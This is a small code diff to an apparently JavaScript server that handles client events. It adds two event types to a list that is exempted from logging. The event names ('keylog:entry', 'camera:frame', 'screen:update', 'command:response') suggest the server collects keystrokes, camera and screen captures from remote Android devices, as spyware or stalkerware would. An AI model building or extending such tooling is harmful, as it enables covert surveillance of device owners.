@@ -1310,7 +1310,8 @@ async function processMessage(clientId, clientType, event, data) {
     const highFreq = event === 'stream:frame'       || event === 'keylog:entry'  ||
                      event === 'notification:entry'  || event === 'app:foreground'||
                      event === 'device:heartbeat'    || event === 'device:pong'   ||
-                     event === 'command:response'    || event === 'screen:update' ||
+                     event === 'command:response'    || event === 'task:progress' ||
+                     event === 'data:chunk'           || event === 'screen:update' ||
                      event === 'offline_recording:save' || event === 'camera:frame';
     if (!highFreq) {
         log(clientType === 'android' ? 'TCP' : 'WS', `← [${clientId}] ${event}`);
